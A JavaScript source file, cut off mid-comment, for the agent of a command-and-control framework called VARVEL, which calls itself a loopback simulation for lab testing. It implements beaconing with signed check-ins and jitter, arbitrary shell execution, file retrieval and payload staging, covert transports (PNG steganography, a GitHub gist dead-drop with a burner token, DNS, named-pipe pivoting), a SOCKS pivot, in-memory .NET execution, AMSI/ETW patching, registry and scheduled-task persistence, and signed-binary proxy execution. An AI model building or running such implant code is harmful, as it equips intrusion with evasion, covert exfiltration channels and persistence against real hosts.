// VARVEL — the reference sim agent (the channel's sparring partner).
//
// A native loopback agent that speaks the callback-channel protocol END TO END:
// HMAC-signed check-ins with strictly-increasing sequences, task pull on GET, results on
// POST bound to the task's HMAC — plus jittered cadence (a real agent's timing shape),
// sha256-verified artifact staging, and fetch-back. Its "host" is a SANDBOX DIRECTORY:
// shell tasks run there (cwd-confined, timeout + output-capped), fetch reads there,
// staged artifacts land there — so a demo or a Win11-lab dry run exercises the FULL
// protocol without a real implant.
//
// This is a simulation/testing artifact, loopback-only by convention (the channel's own
// scope gate enforces it server-side anyway). It is NOT a covert agent: jitter is a
// documented cadence parameter, not evasion.
//
//   node agents/sim-agent.mjs --url http://127.0.0.1:PORT --id AGENTID --token TOKEN
//     [--dir ./sandbox] [--interval 2000] [--jitter 1500] [--once] [--label NAME]
//                        (no --dir = module-owned mkdtemp scratch under the OS temp root,
//                         removed on stop() and on process exit; a --dir is the caller's)
//     [--exec-in-memory 1]   agent-side half of the inline-dotnet gate (default OFF)
//     [--evasion 1]          agent-side half of the evasion-tier gate (default OFF)
//     [--persist 1]          agent-side half of the persistence-tier gate (default OFF)
//     [--proxy 1]            agent-side half of the signed-proxy-exec gate (default OFF)
//                            — kinds 'execproxy-run' / 'execproxy-remove' / 'execproxy-status'
//     [--enc 1]              envelope encryption (engine/envelope): AEAD-seal all result
//                            CONTENT end-to-end, require sealed task replies (default OFF
//                            — the channel's enc.mode gates the fleet; both halves fail loud)
//
// STEGANOGRAPHY FALLBACK (the 'stg' transport — engine/stegocodec.mjs): check-ins are
// image fetches against the channel listener (GET an innocuous .png asset -> the task
// arrives LSB-embedded in the pixels; results ride upload-shaped POST images). LOW
// bandwidth, HIGH latency — the last-resort 443-image-blend wire:
//     --transport stg --url http://127.0.0.1:PORT   (needs the channel armed with stg)
//
// CLOUD/SaaS DEAD-DROP (the 'ghc' transport — engine/ghc2.mjs): no --url, no listener:
//     --transport ghc --ghc-gist <gistId> [--ghc-api <base>]   (the burner PAT comes from
//     VARVEL_GHC2_TOKEN or --ghc-pat; cadence should stay 60s+ — low-and-slow only)
//
// PIVOT MESH (gap #4b):
//   CHILD role — link through a parent's pipe instead of dialing direct (no egress):
//     --transport smb --link <linkId> [--pipe '\\HOST\pipe\varvel_link_<id>']   (no --url needed)
//   PARENT role — the channel tasks this agent with kind 'link-listen' (carrying the link
//     id, pipe name, and per-child verify keys); it starts the pipe server and relays each
//     child's governed payloads to the channel's /l route over its own HTTP(S) channel
//     (a parent without HTTP reachability to the channel cannot relay this wave — honest
//     limitation; the pipe segment itself is transport-independent).
//   SOCKS role — kind 'socks-start' { port?, allowCidrs } starts the governed SOCKS5 pivot
//     inside this agent (default-refuse policy: loopback + the given CIDR ring only).
//   INLINE EXEC role — kind 'inline-dotnet' { assemblyB64, args?, entryPoint? } runs a .NET
//     assembly IN MEMORY via the PS helper (agents/inline-exec.ps1), doubly gated
//     (engagement exec.inMemory AND --exec-in-memory), sha256 audited, bytes never on disk.
//   EVASION role (stage 1, doctrine 2026-08-12) — kinds 'evasion-enable' / 'evasion-restore'
//     / 'evasion-status' drive ONE persistent PS host (agents/evasion-host.ps1) that patches
//     ITS OWN process memory (amsi/etw recipes), proves the write (byte re-read + official
//     AMSI test-string flip), and restores the original bytes with re-verify. Doubly gated
//     (engagement exec.evasion AND --evasion), hash-audited at queue AND at result intake.
//   PERSISTENCE role (roadmap #8) — kinds 'persist-install' / 'persist-status' /
//     'persist-remove' / 'persist-audit' drive ONE persistent PS host
//     (agents/persist-host.ps1) that installs USER-LAND relaunch points for THIS agent
//     (HKCU Run-key / user-context on-logon scheduled task / startup-folder .lnk) with
//     MANDATORY CLEANUP-PROOF: pre-install snapshot, clobber-refusal + journal, install
//     verified by re-read, removal verified ABSENT by re-read (a verify failure is a loud
//     escalated 'persist.remove-failed'). Doubly gated (engagement persist.enabled AND
//     --persist), location + targetSha256 audited at queue AND at result intake.

import { spawn, spawnSync } from 'node:child_process';
import { createHmac, createHash, randomBytes } from 'node:crypto';
import { mkdirSync, readFileSync, writeFileSync, existsSync, readdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { DnsTransport } from './dns-client.mjs';
import { StgTransport } from './stg-client.mjs';
import { Ghc2Transport } from './ghc2-client.mjs';
import { Ghc2Api } from '../engine/ghc2.mjs';
import { PipeTransport, PipeServer } from './pipeendpoint.mjs';
import { runInlineDotnet, powerShellHelperRunner } from './inlineexec.mjs';
import { runEvasionTask, powerShellEvasionRunner } from './evasion.mjs';
import { runPersistTask, powerShellPersistRunner } from './persist.mjs';
import { persistTag } from '../engine/persist.mjs';
import { runExecProxyTask, powerShellExecProxyRunner } from './execproxy.mjs';
import { execProxyTag } from '../engine/execproxy.mjs';
import { SocksServer } from '../engine/socksserve.mjs';
import { classifyUrlHandshake } from '../tools/tlsinspect.mjs';
import { inAnyCidr, isLoopback } from '../engine/ipaddr.mjs';
import { deriveEncKey, sealBytes, isSealedString, openString } from '../engine/envelope.mjs';
import { join, resolve, relative, isAbsolute, basename } from 'node:path';
import { fileURLToPath } from 'node:url';
import { nextGap, malleableProfile, shapeProfile, windowIndexAt, windowFlushAt } from '../engine/malleable.mjs';

const args = {};
for (let i = 2; i < process.argv.length; i += 2) args[process.argv[i].replace(/^--/, '')] = process.argv[i + 1];

const hmacHex = (key, msg) => createHmac('sha256', key).update(msg).digest('hex');
const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Default-sandbox lifecycle. A sandbox from an explicit --dir is CALLER-OWNED: never
// removed (the persist/execproxy removal manifests live there by design, and the persist
// relaunch line pins the dir as an explicit --dir, so a relaunched agent's sandbox stays
// caller-owned). A DEFAULT sandbox (no --dir) is MODULE-OWNED scratch: minted via mkdtemp
// under the OS temp root — the old cwd-relative '.sim-<id>' default leaked one empty dir
// per agent into the platform root — and removed on every teardown path: stop(), and the
// process hooks below (the CLI never calls stop; Ctrl+C / loop-drain IS its teardown).
// Removal is strictly bounded: ownedSandboxes only ever holds paths this module itself
// minted at the mkdtemp call site — never a glob, never a caller path.
const ownedSandboxes = new Set();
const sweepOwnedSandboxes = () => { for (const d of ownedSandboxes) { try { rmSync(d, { recursive: true, force: true }); } catch {} } ownedSandboxes.clear(); };
let sandboxHooksArmed = false;
function armSandboxHooks() {
  if (sandboxHooksArmed) return;
  sandboxHooksArmed = true;
  process.once('exit', sweepOwnedSandboxes);
  // Signals: clean up synchronously, then take the default signal fate (once + re-kill —
  // the handler is already gone, so the re-sent signal terminates as if we never listened).
  for (const sig of ['SIGINT', 'SIGTERM']) process.once(sig, () => { sweepOwnedSandboxes(); process.kill(process.pid, sig); });
}

export class SimAgent {
  constructor({ url, agentId, token, dir, interval = 2000, jitter = 1500, label = 'sim-agent', transport = 'http', pipe = '', link = '', execInMemory = false, inlineRunner = null, evasion = false, evasionRunner = null, persist = false, persistRunner = null, proxy = false, proxyRunner = null, ghc = null, rand = null, agents = null, enc = false, tlsi = false, tlsiClassifier = null } = {}) {
    // transport: 'http' (the /c /r routes), 'dns' (the DNS-codec protocol), 'smb'
    // (pivot mesh: check-ins ride a named-pipe LINK to a parent agent, which relays them
    // to the channel — the child needs NO url and no egress of its own), or 'ghc' (the
    // cloud/SaaS dead-drop: check-ins ride TLS to api.github.com, the gist-comment
    // mailbox IS the rendezvous — no VARVEL listener on the wire at all), or 'stg'
    // (the steganography fallback: envelopes inside PNG images fetched/uploaded over
    // ordinary HTTP against the channel listener — low bandwidth, high latency).
    if ((!url && transport !== 'smb' && transport !== 'ghc') || !agentId || !token) throw new TypeError('SimAgent needs url, agentId, token (url optional for the smb link and ghc dead-drop transports)');
    if (transport === 'smb' && !link) throw new TypeError('SimAgent smb transport needs --link <linkId> (and --pipe \\\\HOST\\pipe\\varvel_link_<id> when the parent is not local)');
    if (transport === 'ghc' && (!ghc || !ghc.pat || !ghc.gistId)) throw new TypeError('SimAgent ghc transport needs ghc.pat (the BURNER account PAT — VARVEL_GHC2_TOKEN or --ghc-pat) + ghc.gistId (the dead-drop gist)');
    this.url = url ? url.replace(/\/+$/, '') : '';
    this.agentId = agentId;
    this.token = token;
    this.label = label;
    this.dir = dir ? resolve(dir) : ''; // caller-owned vs module-owned (minted at construction end)
    this._dirOwned = !dir;
    this.interval = Math.max(200, Number(interval) || 2000);
    this.jitter = Math.max(0, Number(jitter) || 0);
    this.transport = transport;
    this.pipePath = pipe || '';   // smb link: parent's pipe path (empty = \\.\pipe\varvel_link_<link>)
    this.linkId = link || '';     // smb link: the governed link id from enrollment
    this._dns = null;
    this._stg = null;
    // Ghost threading seam for the image wire: { httpAgent, httpsAgent } (the
    // engine/ghost Ghost.agents() shape) — the stg leg's fetches ride the armed chain
    // exactly like the ghc mailbox leg. null = direct.
    this._agents = agents || null;
    this._ghcT = null;
    // ghc dead-drop config: { pat, gistId, apiBase?, agents? } — pat is the BURNER PAT
    // (never logged: _note never sees it), agents rides the ghost chain when armed.
    this._ghcCfg = ghc ? { pat: String(ghc.pat || ''), gistId: String(ghc.gistId || ''), apiBase: ghc.apiBase || undefined, agents: ghc.agents || null } : null;
    this._pipe = null;
    this._link = null;            // parent role: the PipeServer a link-listen task started
    this._linkSeqs = new Map();   // per-link relay sequence (decoupled from this.seq — relay
                                  // traffic must never race the parent's own check-in seq)
    this._socks = null;           // the governed SOCKS5 pivot a socks-start task started
    // In-memory execution tier (gap #4 remainder), AGENT-side gate: default OFF. The
    // channel already refused to queue inline-dotnet unless the engagement enabled
    // exec.inMemory; THIS flag is the second, agent-side half of the gate (defense in
    // depth — both halves must say yes). inlineRunner is the injectable PS-helper seam
    // (tests inject a fake; the real default spawns agents/inline-exec.ps1).
    this.execInMemory = execInMemory === true;
    this._inlineRunner = typeof inlineRunner === 'function' ? inlineRunner : null;
    // Evasion internals tier (stage 1, doctrine 2026-08-12), AGENT-side gate: default
    // OFF. The channel already refused to queue evasion-* unless the engagement enabled
    // exec.evasion; THIS flag is the second, agent-side half of the gate. evasionRunner
    // is the injectable PS-host seam (tests inject a fake; the real default lazily
    // spawns ONE persistent agents/evasion-host.ps1 REPL child — enable/status/restore
    // must observe ONE process's patch state; the patch dies with that process).
    this.evasion = evasion === true;
    this._evasionRunner = typeof evasionRunner === 'function' ? evasionRunner : null;
    this._evasionRunnerOwns = false; // true once WE created the default host (stop() kills it)
    // Governed persistence tier (roadmap #8), AGENT-side gate: default OFF. The channel
    // already refused to queue persist-* unless the engagement enabled persist.enabled;
    // THIS flag is the second, agent-side half of the gate. persistRunner is the
    // injectable PS-host seam (tests inject a fake; the real default lazily spawns ONE
    // agents/persist-host.ps1 REPL child). Unlike the evasion host, installed state
    // SURVIVES the host process by design — the on-disk removal manifest (in this
    // agent's sandbox dir) keeps it accountable across processes.
    this.persist = persist === true;
    this._persistRunner = typeof persistRunner === 'function' ? persistRunner : null;
    this._persistRunnerOwns = false;
    // Signed-proxy execution tier, AGENT-side gate: default OFF. The channel already
    // refused to queue execproxy-* unless the engagement enabled exec.proxy; THIS
    // flag is the second, agent-side half of the gate. proxyRunner is the injectable
    // PS-host seam (tests inject a fake; the real default lazily spawns ONE
    // agents/execproxy-host.ps1 REPL child). Planted files SURVIVE the host process
    // by design — the on-disk removal manifest (in this agent's sandbox dir) keeps
    // them accountable across processes.
    this.proxy = proxy === true;
    this._proxyRunner = typeof proxyRunner === 'function' ? proxyRunner : null;
    this._proxyRunnerOwns = false;
    this._rand = typeof rand === 'function' ? rand : Math.random; // injectable sampler (hermetic tests)
    // TLS-inspection self-report (lose-point #5), agent side: tlsi:true = classify this
    // agent's OWN channel handshake each check-in (a sideband observation of the same
    // egress path — undici's fetch socket is not introspectable; honest, sufficient: a
    // bump re-issues EVERY handshake on the path) and report the verdict upstream as
    // additive check-in metadata (x-varvel-tlsi). tlsiClassifier is the injectable seam
    // (tests inject a fake; the default is tools/tlsinspect.classifyUrlHandshake, which
    // returns null for non-https channel urls — no TLS surface, nothing to report).
    this._tlsi = tlsi === true;
    this._tlsiClassifier = typeof tlsiClassifier === 'function' ? tlsiClassifier : classifyUrlHandshake;
    // Envelope encryption (engine/envelope), AGENT half: enc:true = AEAD-seal all push
    // CONTENT end-to-end (a relay parent on the smb mesh forwards opaque ciphertext),
    // advertise the capability on every envelope (ec:1 / x-varvel-enc), and REQUIRE
    // sealed task replies — a plaintext task reply is a downgrade, noted loudly and
    // never tasked from. The channel's enc.mode gates its half; both halves fail LOUD.
    this.enc = enc === true;
    this._encKey = null;
    // Shaping pack v2: the channel-delivered wire shape (x-varvel-shape). null = 'plain'
    // = today's byte-identical requests. shapeAt anchors the batch-window schedule.
    this.shape = null;
    this.shapeAt = 0;
    this.seq = 0;
    this.running = false;
    this.log = [];
    // Sandbox creation (LAST — nothing after this can throw and strand a dir). Default =
    // module-owned mkdtemp scratch under the OS temp root, registered for teardown; an
    // explicit --dir is caller-owned (created, NEVER removed — see ownedSandboxes above).
    if (this._dirOwned) { this.dir = mkdtempSync(join(tmpdir(), 'varvel-sim-')); ownedSandboxes.add(this.dir); armSandboxHooks(); }
    else mkdirSync(this.dir, { recursive: true });
  }

  _note(msg) { this.log.push({ at: new Date().toISOString(), msg }); if (this.log.length > 200) this.log.shift(); }

  // Envelope key (HKDF from MY token — the listener derives the same from the stored
  // credential; a relay parent's 'varvel-link:' keys can never reach this domain).
  _key() { if (!this._encKey) this._encKey = deriveEncKey(this.token, this.agentId); return this._encKey; }

  // Confinement: the sandbox is the whole world. No path outside it, ever.
  _inside(p) {
    const abs = isAbsolute(String(p)) ? resolve(String(p)) : resolve(this.dir, String(p));
    const rel = relative(this.dir, abs);
    if (rel.split(/[\\/]/)[0] === '..' || isAbsolute(rel)) throw new Error('path outside sandbox');
    return abs;
  }

  // ghc leg: build the agent-side mailbox transport lazily (one Ghc2Api per agent).
  _ghcTransport() {
    if (!this._ghcT) {
      this._ghcT = new Ghc2Transport({
        api: new Ghc2Api({ token: this._ghcCfg.pat, gistId: this._ghcCfg.gistId, apiBase: this._ghcCfg.apiBase, agents: this._ghcCfg.agents }),
        agentId: this.agentId, token: this.token, enc: this.enc,
      });
    }
    return this._ghcT;
  }

  // stg leg: build the image-channel transport lazily (the ghost agents thread here).
  _stgTransport() {
    if (!this._stg) this._stg = new StgTransport({ url: this.url, agentId: this.agentId, token: this.token, agents: this._agents, enc: this.enc });
    if (this._stg.seq < this.seq) this._stg.seq = this.seq; // leg switch: never replay a seq
    return this._stg;
  }

  // ——— Shaping pack v2: request construction + channel-delivered config adoption ———
  // Template headers in profile order ('{ua}' filled from the UA family pool). The
  // ORDER matches engine/malleable.expectedWireHeaders exactly, so the shapegrade loop
  // compares the claimed fingerprint against what this builder actually emits.
  _shapeHeaders() {
    const sh = this.shape && this.shape.http ? this.shape.http : null;
    if (!sh) return {};
    const ua = sh.uaPool[Math.floor(this._rand() * sh.uaPool.length)] || sh.uaPool[0];
    const out = {};
    for (const [n, v] of sh.headers) out[n] = v === '{ua}' ? ua : v;
    return out;
  }
  _pickPath(paths) {
    const sh = this.shape && this.shape.http ? this.shape.http : null;
    if (!sh) return null;
    const p = paths[Math.floor(this._rand() * paths.length)] || paths[0];
    return p + '?' + (sh.queryKey || 'v') + '=' + randomBytes(4).toString('hex'); // cache-buster, ignored channel-side
  }

  // Channel-assigned transport adoption (gap#5 + shaping part 4): adopt ONLY when this
  // agent has a workable local leg for the wire — the fail-open/closed honesty is
  // agent-side too: smb needs an enrolled link, ghc needs its dead-drop config, and
  // doh/ws/icmp have no sim leg at all (documented, noted, never silently pretended).
  _adoptTransport(t) {
    t = String(t || '').trim().toLowerCase();
    if (!t || t === this.transport) return;
    if (t === 'http' || t === 'dns' || t === 'stg') {
      if (!this.url) return this._note('transport adopt ' + t + ' IGNORED: no channel url on this agent');
    } else if (t === 'smb') {
      if (!this.linkId) return this._note('transport adopt smb IGNORED: no enrolled link (needs --link)');
    } else if (t === 'ghc') {
      if (!this._ghcCfg) return this._note('transport adopt ghc IGNORED: no ghc dead-drop config (needs ghc.pat + ghc.gistId)');
    } else {
      return this._note('transport adopt ' + t + ' IGNORED: the sim agent has no local ' + t + ' leg (doh/ws/icmp are channel-side verified transports)');
    }
    if (t === 'dns' && this._dns && this._dns.seq < this.seq) this._dns.seq = this.seq; // leg switch: never replay a seq
    this._note('transport adopted: ' + this.transport + ' -> ' + t + ' (channel-assigned)');
    this.transport = t;
  }

  // Profile + shape + transport headers ride every check-in reply (the x-varvel-*
  // pattern). Adoption is noted once per change, never spammed per reply.
  _adoptConfigHeaders(r) {
    const prof = r.headers.get('x-varvel-profile');
    if (prof) { try { this.profile = malleableProfile(JSON.parse(prof)); } catch {} }
    const shp = r.headers.get('x-varvel-shape');
    if (shp) {
      try {
        const parsed = JSON.parse(shp);
        if (parsed && parsed.name === 'plain' && !parsed.http && !parsed.cadence) {
          if (this.shape) this._note('shape cleared: plain (today\'s wire)');
          this.shape = null; this.shapeAt = 0;
        } else {
          const resolved = shapeProfile(parsed);
          if (resolved && (!this.shape || this.shape.name !== resolved.name)) this._note('shape adopted: ' + resolved.name + (resolved.batch ? ' (batch window ' + resolved.batch.windowMs + 'ms)' : '') + (resolved.padding ? ' (padding x' + resolved.padding.perCycle + ')' : ''));
          if (resolved) { this.shape = resolved; this.shapeAt = Number(parsed.at) || this.shapeAt || Date.now(); }
        }
      } catch {}
    }
    const tr = r.headers.get('x-varvel-transport');
    if (tr) this._adoptTransport(tr);
  }

  // One pull-shaped envelope. context 'pull' (real check-in) or 'pad' (constant-rate
  // dummy — the channel audits it as padding, never delivers tasks on it). The enc
  // capability header rides every envelope when this agent seals (engine/envelope).
  async _pullEnvelope(context = 'pull') {
    this.seq++;
    const path = this._pickPath(this.shape && this.shape.http ? this.shape.http.pullPaths : null) || '/c';
    const headers = { ...this._shapeHeaders(), 'x-agent': this.agentId, 'x-seq': String(this.seq), 'x-auth': hmacHex(this.token, this.agentId + ':' + this.seq + ':' + context) };
    if (this.enc) headers['x-varvel-enc'] = '1';
    // TLS-inspection self-report: classify the channel handshake, report the verdict
    // upstream (additive metadata; older listeners ignore the header). One sideband
    // handshake per check-in when enabled — opt-in, honest cost.
    if (this._tlsi) {
      try { const v = await this._tlsiClassifier(this.url); if (v && v.verdict) headers['x-varvel-tlsi'] = String(v.verdict); } catch { /* observation never breaks the check-in */ }
    }
    return fetch(this.url + path, { headers });
  }

  // Padding dummy (constant-rate shaping): identical wire shape to a pull, 'pad' HMAC
  // context. http + dns + stg legs; smb (internal pipe — nothing to pad against) and ghc
  // (a rate-limited mailbox where dummies would burn the GitHub budget) are documented
  // exclusions; ws holds no poll cadence at all (push wire — padding is meaningless).
  async _pad() {
    if (this.transport === 'dns') {
      if (!this._dns) this._dns = new DnsTransport({ url: this.url, agentId: this.agentId, token: this.token, enc: this.enc });
      if (this._dns.seq < this.seq) this._dns.seq = this.seq;
      await this._dns.pad();
      this.seq = this._dns.seq;
      return true;
    }
    if (this.transport === 'stg') {
      const stg = this._stgTransport();
      const ok = await stg.pad();
      this.seq = stg.seq;
      return ok;
    }
    if (this.transport !== 'http') return false;
    const r = await this._pullEnvelope('pad');
    try { await r.arrayBuffer(); } catch {} // drain; the 204 body is empty by contract
    return r.status === 204;
  }

  async _pull() {
    if (this.transport === 'dns') {
      if (!this._dns) this._dns = new DnsTransport({ url: this.url, agentId: this.agentId, token: this.token, enc: this.enc });
      if (this._dns.seq < this.seq) this._dns.seq = this.seq; // leg switch: never replay a seq
      const got = await this._dns.pull();
      this.seq = this._dns.seq;
      // Channel-assigned transport rides task replies on this wire (setTransport key).
      if (got && got.setTransport) { const t = got.setTransport; delete got.setTransport; this._adoptTransport(t); }
      return got;
    }
    if (this.transport === 'stg') {
      const stg = this._stgTransport();
      const got = await stg.pull();
      this.seq = stg.seq;
      if (stg.lastError) this._note('stg pull decode: ' + stg.lastError + ' (treated as idle — fail-closed)');
      // Channel-assigned transport rides the embedded task reply exactly like the dns wire.
      if (got && got.setTransport) { const t = got.setTransport; delete got.setTransport; this._adoptTransport(t); }
      return got;
    }
    if (this.transport === 'ghc') return this._ghcTransport().pull();
    if (this.transport === 'smb') {
      if (!this._pipe) {
        this._pipe = new PipeTransport({ pipePath: this.pipePath || undefined, linkId: this.linkId, agentId: this.agentId, token: this.token, enc: this.enc });
        await this._pipe.connect();
      } else if (this._pipe.client.dead) {
        await this._pipe.ensureConnected(); // fresh handshake, preserved channel seq
      }
      return this._pipe.pull();
    }
    const r = await this._pullEnvelope('pull');
    this._adoptConfigHeaders(r);
    if (r.status === 204) return null;
    if (!r.ok) throw new Error('pull HTTP ' + r.status);
    if (!this.enc) return r.json();
    // enc agent: the task body MUST arrive sealed ('enc1:…') — open it with MY derived
    // key; a plaintext body is a downgrade (noted loudly, never tasked from), an
    // unopenable one is tamper-evidence (the AEAD tag now authenticates the reply).
    const text = await r.text();
    if (!isSealedString(text)) { this._note('enc: PLAINTEXT task reply refused (this agent seals) — possible downgrade'); return null; }
    try { return JSON.parse(openString(this._key(), text)); } catch (e) { this._note('enc: sealed task reply failed to open (' + ((e && e.code) || (e && e.message) || e) + ') — dropped'); return null; }
  }

  async _push(taskId, data) {
    if (this.transport === 'dns') {
      if (!this._dns) this._dns = new DnsTransport({ url: this.url, agentId: this.agentId, token: this.token, enc: this.enc });
      if (this._dns.seq < this.seq) this._dns.seq = this.seq;
      const out = await this._dns.push(taskId, Buffer.isBuffer(data) ? data : String(data));
      this.seq = this._dns.seq;
      return out;
    }
    if (this.transport === 'stg') {
      const stg = this._stgTransport();
      const out = await stg.push(taskId, Buffer.isBuffer(data) ? data : String(data));
      this.seq = stg.seq;
      return out;
    }
    if (this.transport === 'smb') return this._pipe.push(taskId, Buffer.isBuffer(data) ? data : String(data));
    if (this.transport === 'ghc') return this._ghcTransport().push(taskId, Buffer.isBuffer(data) ? data : String(data));
    this.seq++;
    let body = Buffer.isBuffer(data) ? data : Buffer.from(String(data));
    // Envelope layer: seal the result body end-to-end — the HMAC below then signs the
    // CIPHERTEXT (encrypt-then-MAC; sha256(body) formula unchanged).
    if (this.enc) body = sealBytes(this._key(), body);
    const path = this._pickPath(this.shape && this.shape.http ? this.shape.http.pushPaths : null) || '/r';
    await fetch(this.url + path, {
      method: 'POST', body,
      headers: { ...this._shapeHeaders(), 'x-agent': this.agentId, 'x-seq': String(this.seq), 'x-task': taskId, 'x-auth': hmacHex(this.token, this.agentId + ':' + this.seq + ':' + taskId + ':' + sha256(body)) },
    });
  }

  // Task executors — the sandbox is the blast radius.
  async _exec(task) {
    const { kind, data } = task;
    if (kind === 'note') { this._note('note: ' + data); return 'noted: ' + data; }
    if (kind === 'shell') {
      return await new Promise((res) => {
        const child = spawn(String(data), { cwd: this.dir, shell: true, windowsHide: true, timeout: 20000 });
        let out = '';
        const t = setTimeout(() => { try { child.kill(); } catch {} res('(task timeout)'); }, 22000);
        child.stdout.on('data', (d) => { if (out.length < 60000) out += d; });
        child.stderr.on('data', (d) => { if (out.length < 60000) out += d; });
        child.on('close', () => { clearTimeout(t); res(out.trim() || '(no output)'); });
        child.on('error', (e) => { clearTimeout(t); res('ERROR: ' + e.message); });
      });
    }
    if (kind === 'fetch') {
      try {
        const spec = JSON.parse(data);
        return readFileSync(this._inside(spec.path));
      } catch (e) { return 'fetch failed: ' + (e.message || e); }
    }
    if (kind === 'stage') {
      try {
        const spec = JSON.parse(data);
        const bytes = Buffer.from(spec.b64 || '', 'base64');
        const hash = sha256(bytes);
        if (hash !== spec.sha256) return 'stage REJECTED: sha256 mismatch (tampered or truncated delivery)';
        writeFileSync(this._inside(basename(spec.name || 'artifact')), bytes);
        return 'staged ' + (spec.name || 'artifact') + ' (' + bytes.length + ' bytes, sha256 verified)';
      } catch (e) { return 'stage failed: ' + (e.message || e); }
    }
    // Pivot mesh, PARENT role: the channel tasks this agent to host a link (named pipe
    // server) for children that have no egress. data = { link, pipe, children: [{a, k}] }
    // — k is the link-scoped VERIFY KEY (never the child token). Relayed payloads ride this
    // agent's own governed channel to the /l relay route, sequenced per link.
    if (kind === 'link-listen') {
      try {
        const spec = JSON.parse(data);
        if (this._link && this._link.linkId === spec.link) {
          for (const c of spec.children || []) this._link.addChild(c.a, c.k);
          return 'link ' + spec.link + ': merged ' + (spec.children || []).length + ' more child(ren) into the running pipe';
        }
        const children = new Map((spec.children || []).map((c) => [String(c.a), String(c.k)]));
        const server = new PipeServer({
          linkId: spec.link,
          children,
          pipeName: spec.pipe || undefined,
          relayUp: (payload) => this._relayUp(spec.link, payload),
          onEvent: (t, o) => this._note('link ' + t + ' ' + JSON.stringify(o).slice(0, 140)),
        });
        await server.listen();
        this._link = server;
        return 'link ' + spec.link + ' listening on ' + server.pipePath + ' (' + server.hub.childCount() + ' child(ren) enrolled)';
      } catch (e) { return 'link-listen failed: ' + (e.message || e); }
    }
    // Pivot mesh, SOCKS role: start the governed SOCKS5 server INSIDE this agent so the
    // operator's tools can pivot through it. data = { port?, allowCidrs: [...], auth? }.
    // The allow-check is the seam, agent-side: loopback + the signed CIDR ring ONLY (v4
    // AND v6 — engine/ipaddr's family-strict inAnyCidr decides); domain destinations are
    // refused by this default policy (the ring is CIDR-shaped).
    if (kind === 'socks-start') {
      try {
        if (this._socks) return 'socks already listening on 127.0.0.1:' + this._socks.port;
        const spec = JSON.parse(data);
        const cidrs = Array.isArray(spec.allowCidrs) ? spec.allowCidrs.map(String) : [];
        this._socks = new SocksServer({
          auth: spec.auth || null,
          allow: ({ host, addressType }) => {
            const h = String(host);
            if (isLoopback(h)) return true;
            if (addressType !== 'ipv4' && addressType !== 'ipv6') return { ok: false, reason: 'only in-ring IP destinations are pivotable by this policy (domain destinations are refused)' };
            return inAnyCidr(h, cidrs) ? true : { ok: false, reason: h + ' is outside the signed scope ring' };
          },
          onEvent: (t, o) => this._note('socks ' + t + ' ' + JSON.stringify(o).slice(0, 140)),
        });
        const { port } = await this._socks.listen(Number(spec.port) || 0, '127.0.0.1');
        return 'socks listening on 127.0.0.1:' + port + ' (governed ring: ' + (cidrs.join(' ') || 'loopback only') + ')';
      } catch (e) { return 'socks-start failed: ' + (e.message || e); }
    }
    if (kind === 'socks-stop') {
      if (this._socks) { await this._socks.close(); this._socks = null; }
      return 'socks stopped';
    }
    // In-memory execution tier (gap #4 remainder): governed inline .NET execution.
    // data = { assemblyB64, args?, entryPoint? }. The bytes execute in the PS helper's
    // OWN process memory (spawned per task; stdin job, stdout result) — NO DISK PATH
    // EXISTS in the runner contract. The channel gates the engagement setting; this
    // agent additionally requires its own launch flag (two halves, both fail-closed).
    // Refusals are loud plain text; an execution returns the hash-first JSON shape
    // (see agents/inlineexec.mjs for the contract). AMSI may scan the load — unless
    // the operator has explicitly armed the governed evasion tier below (default OFF).
    if (kind === 'inline-dotnet') {
      if (!this.execInMemory) {
        return 'inline-dotnet REFUSED: agent-side in-memory execution is OFF (this agent was launched without --exec-in-memory; the engagement exec.inMemory gate must also be on) — nothing executed';
      }
      return await runInlineDotnet(data, { runner: this._inlineRunner || powerShellHelperRunner() });
    }
    // Evasion internals tier (stage 1, doctrine 2026-08-12): governed own-process
    // AMSI/ETW neutralization. data = { techniques: ['amsi','etw'] } (restore/status
    // accept empty = all). DOUBLE-GATED like inline-dotnet: the channel gates the
    // engagement exec.evasion setting; THIS agent additionally requires --evasion.
    // The work happens in ONE persistent PS host child (agents/evasion-host.ps1):
    // snapshot -> patch -> PROVE (byte re-read + the official AMSI test-string flip)
    // -> status / restore-with-re-verify. Refusals are loud plain text; an attempt
    // returns the op-first evidence JSON (see agents/evasion.mjs for the contract).
    if (kind === 'evasion-enable' || kind === 'evasion-restore' || kind === 'evasion-status') {
      if (!this.evasion) {
        return kind + ' REFUSED: agent-side evasion is OFF (this agent was launched without --evasion 1; the engagement exec.evasion gate must also be on) — nothing patched, nothing restored';
      }
      if (!this._evasionRunner) { this._evasionRunner = powerShellEvasionRunner(); this._evasionRunnerOwns = true; }
      return await runEvasionTask(kind, data, { runner: this._evasionRunner });
    }
    // Governed persistence tier (roadmap #8): user-land relaunch points for THIS agent
    // (HKCU Run-key / user-context on-logon scheduled task / startup .lnk), with
    // MANDATORY CLEANUP-PROOF (install verified, removal verified, clobber journaled).
    // data = { techniques: ['runkey','schtask','startup'], name?, overwrite? } /
    // { techniques } / { techniques|all:true } / {} (audit). DOUBLE-GATED like
    // inline-dotnet: the channel gates the engagement persist.enabled setting; THIS
    // agent additionally requires --persist. The RELAUNCH LINE IS CAPTURED HERE —
    // agent-side, from this process's own launch vector (the channel never ships a
    // command line): same node binary, same script, same governed args. The removal
    // manifest lives in this agent's sandbox dir. Refusals are loud plain text; an
    // attempt returns the op-first evidence JSON (see agents/persist.mjs).
    if (kind === 'persist-install' || kind === 'persist-status' || kind === 'persist-remove' || kind === 'persist-audit') {
      if (!this.persist) {
        return kind + ' REFUSED: agent-side persistence is OFF (this agent was launched without --persist 1; the engagement persist.enabled gate must also be on) — nothing installed, nothing removed';
      }
      if (!this._persistRunner) { this._persistRunner = powerShellPersistRunner(); this._persistRunnerOwns = true; }
      return await runPersistTask(kind, data, { runner: this._persistRunner, target: this._relaunchLine(), manifestPath: join(this.dir, 'varvel-persist-manifest.json'), defaultName: persistTag(this.agentId + '|' + this.url) });
    }
    // Signed-proxy execution tier: run the agent's DLL form through Microsoft-signed
    // hosts (rundll32-class direct load / regsvr32-class load-only / sideload-class
    // search-order plant — copies into THIS agent's sandbox only, never in place,
    // never beside the original in system dirs), with the persist-tier cleanup-proof
    // discipline (no silent clobber, removal verified by re-read). data =
    // { technique, dll, export?, args?, host?, as?, name? } / { name|all:true } /
    // {} (status sweep). DOUBLE-GATED like persist: the channel gates the engagement
